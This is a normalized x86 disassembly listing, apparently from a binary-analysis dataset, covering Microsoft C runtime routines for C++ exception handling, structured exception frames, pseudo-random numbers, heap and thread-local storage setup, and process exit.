mov esi [ ecx + eax * 8 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + eax * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax * 8 + 0x4 ]
call sub_412a50
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_411f2e
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_40b2d2
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_411f73
push 0x8
push r--data
call sub_40c290
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_40c2d5
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_4119c0
mov [ ebp - 0x4 ] 0xfffffffe
sub_411fc8
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_411ff1
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
test edi edi
jne r-xdata
and [ ebp - 0x8 ] 0x0
cmp [ edi ] 0x0
mov [ ebp - 0x1 ] 0x0
jle r-xdata
call sub_40bb4e
mov al [ ebp - 0x1 ]
leave
retn
push ebx
push esi
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x4
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
mov ebx [ eax ]
lea esi [ eax + 0x4 ]
test ebx ebx
jle r-xdata
pop esi
pop ebx
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0xc ]
push eax
call sub_411da4
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
sub_4120b5
push 0x2c
push r--data
call sub_40c290
mov ebx ecx
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x1c ] ebx
and [ ebp - 0x34 ] 0x0
mov eax [ edi - 0x4 ]
mov [ ebp - 0x24 ] eax
push [ esi + 0x18 ]
lea eax [ ebp - 0x3c ]
push eax
call sub_411c6d
pop ecx
pop ecx
mov [ ebp - 0x28 ] eax
call sub_40b2d2
mov eax [ eax + 0x88 ]
mov [ ebp - 0x2c ] eax
call sub_40b2d2
mov eax [ eax + 0x8c ]
mov [ ebp - 0x30 ] eax
call sub_40b2d2
mov [ eax + 0x88 ] esi
call sub_40b2d2
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push [ ebp + 0x14 ]
push edi
call sub_411d12
add esp 0x14
mov [ ebp - 0x1c ] eax
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_4121db
mov eax [ ebp - 0x1c ]
call sub_40c2d5
retn
sub_41214e
mov esp [ ebp - 0x18 ]
call sub_40b2d2
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_411e52
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_4121db
mov eax [ ebp - 0x1c ]
call sub_40c2d5
retn
imul eax eax 0x14
mov edx [ eax + ebx + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + ebx + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_4121db
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_411cc0
pop ecx
call sub_40b2d2
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_40b2d2
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_411c99
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_411f73
pop ecx
pop ecx
sub_412251
push 0xc
push r--data
call sub_40c290
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_412ad2
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_412ad2
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_40bb4e
push ebx
push esi
call sub_412ad2
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_412ad2
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_412ad2
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_412ad2
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_412ad2
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_412ad2
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_40a5a0
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_412ad2
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_411fc8
pop ecx
pop ecx
push eax
push esi
call sub_40a5a0
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_40c2d5
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_411fc8
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_4123d0
push 0x8
push r--data
call sub_40c290
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_411fc8
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_4119c0
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_412251
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40c2d5
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_411fc8
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_4119c0
jmp r-xdata
sub_412462
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_4123d0
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_41198e
call sub_4119c7
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_411e52
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_4120b5
add esp 0x28
test eax eax
je r-xdata
sub_4124d0
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_40b2d2
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_40b2d2
lea edi [ eax + 0x80 ]
call sub_40b0e5
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_411bfa
mov ecx [ ebp - 0x4 ]
add esp 0x14
cmp ecx [ ebp - 0xc ]
jae r-xdata
call sub_40bb4e
mov eax [ esi ]
cmp eax 0xe0434f4d
je r-xdata
pop edi
add eax 0xc
mov [ ebp - 0x8 ] eax
push ebx
cmp eax 0xe0434352
je r-xdata
inc [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
add eax 0x14
mov [ ebp - 0x8 ] eax
cmp ecx [ ebp - 0xc ]
jb r-xdata
cmp esi [ eax - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_411a84
add esp 0x1c
test eax eax
jne r-xdata
lea edi [ eax - 0xc ]
cmp esi [ edi ]
jl r-xdata
pop ebx
mov ecx [ eax ]
shl ecx 0x4
add ecx [ eax + 0x4 ]
mov edx [ ecx - 0xc ]
test edx edx
je r-xdata
lea ebx [ ecx - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ edx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_412462
mov esi [ ebp + 0x1c ]
mov eax [ ebp - 0x8 ]
add esp 0x1c
sub_4125d7
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
push esi
push edi
mov [ ebp - 0x1 ] 0x0
cmp eax 0x80
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_40bb4e
cmp ecx eax
jl r-xdata
mov [ ebp - 0x8 ] ecx
cmp ecx 0xffffffff
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_40b2d2
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_40bb4e
call sub_40bb02
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_4124d0
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_40b2d2
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_40b2d2
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_40b2d2
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_412ad2
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_411bfa
mov ecx [ ebp - 0x10 ]
add esp 0x14
cmp ecx [ ebp - 0x20 ]
jae r-xdata
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_40bb4e
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_411f73
pop ecx
pop ecx
lea edi [ eax + 0x10 ]
mov [ ebp - 0x1c ] edi
call sub_40b2d2
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
add edi 0x14
mov [ ebp - 0x1c ] edi
cmp eax [ ebp - 0x20 ]
jb r-xdata
cmp ecx [ edi - 0xc ]
jg r-xdata
call sub_40b2d2
mov edi [ eax + 0x94 ]
call sub_40b2d2
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_411ff1
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
lea eax [ edi - 0x10 ]
mov [ ebp - 0x28 ] eax
cmp [ eax ] ecx
jg r-xdata
mov edi [ ebp + 0x18 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_411ff1
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_40ad33
test al al
jne r-xdata
call sub_40bb4e
cmp eax 0x19930522
jne r-xdata
call sub_40b2d2
call sub_40b2d2
call sub_40b2d2
mov [ eax + 0x88 ] esi
call sub_40b2d2
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
call sub_411da4
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_411f73
pop ecx
pop ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x34 ]
mov [ ebp + 0x8 ] r--data
call sub_40a4e9
push r--data
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x34 ] r--data
call sub_40aef3
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov edi [ ebp - 0x28 ]
push [ ebp + 0x20 ]
mov ebx [ ebp - 0xc ]
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_412462
mov esi [ ebp + 0x8 ]
mov edi [ ebp - 0x1c ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_4119c7
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_411e52
add esp 0x10
push [ esi + 0x1c ]
call sub_41206c
sub_412969
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_40b2d2
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_4125d7
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_411e52
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_412a50
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_41088c
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_41088c
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_412a9c
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] esp
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_4062b0
mov [ ecx ] r--data
jmp sub_40a545
sub_406db0
push esi
mov esi eax
call sub_4092d0
mov eax [ esi ]
push eax
call sub_40a0eb
add esp 0x4
mov [ esi ] 0x0
pop esi
retn
sub_4082a0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
call sub_408920
push 0x0
call sub_40aae0
sub_4082b2
add esp 0x4
xor eax eax
pop ebp
retn 0x4
sub_408fb0
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
retn
push eax
call sub_40a0eb
add esp 0x4
sub_4091d0
mov ecx [ eax + 0x4 ]
push ecx
call sub_40a0eb
pop ecx
retn
sub_409450
mov edx [ ecx + 0xc ]
mov ecx [ ecx ]
mov [ eax + 0x4 ] 0x0
mov [ eax ] ecx
mov [ eax + 0x8 ] edx
retn
sub_4098b0
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
retn
lea esp [ esp ]
mov eax ecx
mov ecx [ eax + 0x8 ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_4099e0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
mov esi ecx
call sub_40a577
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_409eda
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40a577
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_409f27
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40a577
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_409f74
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40a577
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_409fb2
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_40a3e1
sub_40a046
mov edi edi
push ebp
mov ebp esp
call sub_40b2d2
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x14 ] ecx
pop ebp
retn
sub_40a058
call sub_40b2d2
mov ecx eax
mov eax [ ecx + 0x14 ]
imul eax eax 0x343fd
add eax 0x269ec3
mov [ ecx + 0x14 ] eax
shr eax 0x10
and eax 0x7fff
retn
sub_40a0ca
mov edi edi
push ebp
mov ebp esp
push 0xa
push 0x0
push [ ebp + 0x8 ]
call sub_40b92a
add esp 0xc
pop ebp
retn
sub_40a0e0
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_40a0ca
sub_40a0eb
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_409fcc
sub_40a121
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40a0f6
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_40a139
push 0x8
call sub_40bacf
pop ecx
retn
sub_40a142
push 0x8
call sub_40b9f6
pop ecx
retn
sub_40a364
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_40b9f6
pop ecx
sub_40a379
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_40a239
add esp 0xc
pop ebp
retn
sub_40a38f
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_40a239
add esp 0xc
pop ebp
retn
sub_40a3a5
push 0x1
push 0x0
push 0x0
call sub_40a239
add esp 0xc
retn
sub_40a3b4
push 0x1
push 0x1
push 0x0
call sub_40a239
add esp 0xc
retn
sub_40a461
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov ecx [ ecx ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x0
pop ebp
retn 0x8
sub_40a47e
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_40a4cb
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
retn
push [ esi + 0x4 ]
call sub_409fcc
pop ecx
sub_40a545
mov [ ecx ] r--data
jmp sub_40a4cb
sub_40aae0
mov edi edi
push ebp
mov ebp esp
call sub_40b259
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call [ ExitThread@IAT ]
push eax
call sub_40b41b
pop ecx
sub_40aaff
push 0xc
push r--data
call sub_40c290
call sub_40b2d2
and [ ebp - 0x4 ] 0x0
push [ eax + 0x58 ]
call [ eax + 0x54 ]
push eax
call sub_40aae0
sub_40ab34
mov esp [ ebp - 0x18 ]
push [ ebp - 0x1c ]
call sub_40a38f
int3
sub_40acd9
call sub_40cab7
add eax 0x20
push eax
push 0x1
call sub_40cc3d
pop ecx
pop ecx
retn
sub_40acec
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_40ad02
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_40d98f
pop ecx
retn
sub_40aebf
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_40a3b4
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_40c2d5
retn
push eax
call sub_40a38f
_start
call sub_40e144
jmp sub_40ad7c
sub_40b045
push 0x0
push 0x1000
push 0x0
call [ HeapCreate@IAT ]
xor ecx ecx
test eax eax
setne cl
mov [ rw-data ] eax
mov eax ecx
retn
sub_40b0e5
push 0x0
call [ EncodePointer@IAT ]
retn
sub_40b0ee
call [ TlsAlloc@IAT ]
retn 0x4
sub_40b0f7
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ rw-data ]
call [ TlsGetValue@IAT ]
call eax
pop ebp
retn 0x4
sub_40b111
mov eax [ rw-data ]
retn
sub_40b14b
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ebp
retn 0x8
sub_40b247
push 0xd
call sub_40b9f6
pop ecx
retn
sub_40b250
push 0xc
call sub_40b9f6
pop ecx
retn
sub_40b406
push 0xd
call sub_40b9f6
pop ecx
retn
sub_40b412
push 0xc
call sub_40b9f6
pop ecx
retn
sub_40b9f6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_40bac6
push 0xa
call sub_40b9f6
pop ecx
retn
sub_40bb02
push 0x8
push r--data
call sub_40c290
call sub_40b2d2
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_40ed95
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_40bb22
xor eax eax
inc eax
retn
sub_40bb3b
call sub_40b2d2
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_40bb02
call eax
sub_40bb72
xor eax eax
inc eax
retn
sub_40bb86
push sub_40bb02
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
retn
sub_40bb97
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_40bbec
push [ rw-data ]
call [ DecodePointer@IAT ]
retn
sub_40bd60
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_40b9f6
pop ecx
sub_40bd9c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_40bdab
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
